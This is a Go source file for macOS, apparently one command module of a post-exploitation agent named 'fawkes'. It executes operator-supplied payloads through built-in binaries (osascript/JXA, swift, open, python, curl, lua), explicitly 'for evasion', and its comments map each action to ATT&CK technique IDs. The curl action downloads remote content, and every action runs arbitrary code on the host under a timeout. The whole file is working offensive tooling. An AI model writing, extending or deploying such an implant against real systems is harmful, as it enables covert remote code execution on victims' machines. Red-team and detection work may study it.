//go:build darwin
// +build darwin

package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

type LolbinCommand struct{}

func (c *LolbinCommand) Name() string {
	return "lolbin"
}

func (c *LolbinCommand) Description() string {
	return "LOLBins/GTFOBins — execute payloads through legitimate macOS binaries for evasion"
}

type lolbinArgs struct {
	Action string `json:"action"`
	Path   string `json:"path"`
	Export string `json:"export"`
	Args   string `json:"args"`
}

func (c *LolbinCommand) Execute(task structs.Task) structs.CommandResult {
	var args lolbinArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if args.Action == "" {
		return errorResult("Error: action is required (osascript, swift, open, python, curl)")
	}

	switch args.Action {
	case "osascript":
		return lolbinOsascript(args.Path, args.Args)
	case "swift":
		return lolbinSwift(args.Path, args.Args)
	case "open":
		return lolbinOpen(args.Path, args.Args)
	case "python":
		return lolbinPython(args.Path, args.Args)
	case "curl":
		return lolbinCurl(args.Path, args.Args)
	case "lua":
		return lolbinLuaDarwin(args.Path, args.Args)
	default:
		return errorf("Unknown action: %s (use osascript, swift, open, python, curl, lua)", args.Action)
	}
}

// findBinary searches for a binary by trying multiple names in order
func findBinary(names ...string) string {
	for _, name := range names {
		if path, err := exec.LookPath(name); err == nil {
			return path
		}
	}
	return ""
}

// runWithTimeout executes a command with timeout and returns formatted output
func runWithTimeout(binary string, cmdArgs []string) structs.CommandResult {
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, binary, cmdArgs...)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] %s %s\n", binary, strings.Join(cmdArgs, " "))
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}
	return successResult(result)
}

// lolbinOsascript — T1059.002 — Execute AppleScript or JavaScript via osascript
func lolbinOsascript(code, extraArgs string) structs.CommandResult {
	binary := findBinary("osascript")
	if binary == "" {
		return errorResult("Error: osascript not found on this system")
	}

	if code == "" && extraArgs == "" {
		return errorResult("Error: provide AppleScript in 'path' field or script path in 'args' field")
	}

	var cmdArgs []string
	if code != "" {
		// Check if this is JavaScript (JXA)
		if strings.HasPrefix(code, "JXA:") {
			cmdArgs = []string{"-l", "JavaScript", "-e", strings.TrimPrefix(code, "JXA:")}
		} else {
			cmdArgs = []string{"-e", code}
		}
		if extraArgs != "" {
			cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
		}
	} else {
		cmdArgs = strings.Fields(extraArgs)
	}

	return runWithTimeout(binary, cmdArgs)
}

// lolbinSwift — T1059 — Compile and execute inline Swift code
func lolbinSwift(code, extraArgs string) structs.CommandResult {
	binary := findBinary("swift")
	if binary == "" {
		return errorResult("Error: swift not found on this system (requires Xcode CLI tools)")
	}

	if code == "" && extraArgs == "" {
		return errorResult("Error: provide Swift code in 'path' field or script path in 'args' field")
	}

	if code != "" {
		// Write source to temp file for compilation
		srcFile, err := os.CreateTemp("", "fawkes-*.swift")
		if err != nil {
			return errorf("Error creating temp file: %v", err)
		}
		srcPath := srcFile.Name()
		defer os.Remove(srcPath)

		if _, err := srcFile.WriteString(code); err != nil {
			srcFile.Close()
			return errorf("Error writing source: %v", err)
		}
		srcFile.Close()

		// swift runs .swift files directly (interpreted mode)
		cmdArgs := []string{srcPath}
		if extraArgs != "" {
			cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
		}
		return runWithTimeout(binary, cmdArgs)
	}

	// Script file execution
	cmdArgs := strings.Fields(extraArgs)
	return runWithTimeout(binary, cmdArgs)
}

// lolbinOpen — T1204.002 — Launch applications via open command
func lolbinOpen(appOrFile, extraArgs string) structs.CommandResult {
	binary := findBinary("open")
	if binary == "" {
		return errorResult("Error: open not found on this system")
	}

	if appOrFile == "" {
		return errorResult("Error: application name or file path required in 'path' field")
	}

	var cmdArgs []string
	// Check if this looks like an app name vs a file path
	if strings.HasSuffix(appOrFile, ".app") || !strings.Contains(appOrFile, "/") {
		// Launch by app name: open -a AppName
		cmdArgs = []string{"-a", appOrFile}
	} else {
		// Open a file
		cmdArgs = []string{appOrFile}
	}

	if extraArgs != "" {
		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
	}

	return runWithTimeout(binary, cmdArgs)
}

// lolbinPython — T1059.006 — Execute Python code inline or from file
func lolbinPython(code, extraArgs string) structs.CommandResult {
	binary := findBinary("python3", "python")
	if binary == "" {
		return errorResult("Error: python3/python not found on this system")
	}

	if code == "" && extraArgs == "" {
		return errorResult("Error: provide code in 'path' field or script path in 'args' field")
	}

	var cmdArgs []string
	if code != "" {
		cmdArgs = []string{"-c", code}
		if extraArgs != "" {
			cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
		}
	} else {
		cmdArgs = strings.Fields(extraArgs)
	}

	return runWithTimeout(binary, cmdArgs)
}

// lolbinCurl — T1105 — Download and optionally execute via curl
func lolbinCurl(url, extraArgs string) structs.CommandResult {
	binary := findBinary("curl")
	if binary == "" {
		return errorResult("Error: curl not found on this system")
	}

	if url == "" {
		return errorResult("Error: URL is required in 'path' field")
	}

	var cmdArgs []string
	if extraArgs != "" {
		cmdArgs = append([]string{url}, strings.Fields(extraArgs)...)
	} else {
		cmdArgs = []string{"-s", url}
	}

	return runWithTimeout(binary, cmdArgs)
}

// lua — T1059 — Execute Lua script via lua interpreter
func lolbinLuaDarwin(scriptPath, extraArgs string) structs.CommandResult {
	binary := findBinary("lua", "lua5.4", "lua5.3", "luajit")
	if binary == "" {
		return errorResult("Error: no Lua interpreter found (lua, lua5.4, lua5.3, luajit)")
	}

	cmdArgs := []string{scriptPath}
	if extraArgs != "" {
		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
	}

	return runWithTimeout(binary, cmdArgs)
}
